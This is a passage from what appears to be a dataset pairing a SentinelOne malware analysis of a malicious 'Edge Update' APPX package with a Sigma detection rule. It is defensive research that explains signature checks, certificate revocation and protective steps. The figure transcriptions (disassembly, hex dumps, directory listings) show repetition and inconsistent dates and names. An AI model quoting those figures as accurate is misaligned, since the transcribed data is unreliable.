Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Suspicious AppX Package Installation Attempt",
      "id": "898d5fc9-fbc3-43de-93ad-38e97237c344",
      "status": "test",
      "description": "Detects an appx package installation with the error code \"0x80073cff\" which indicates that the package didn't meet the signing requirements and could be suspicious",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 401,
          "ErrorCode": "0x80073cff"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate AppX packages not signed by MS used part of an enterprise"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_appx_package_installation.yml",
    "id": "700"
  },
  {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The 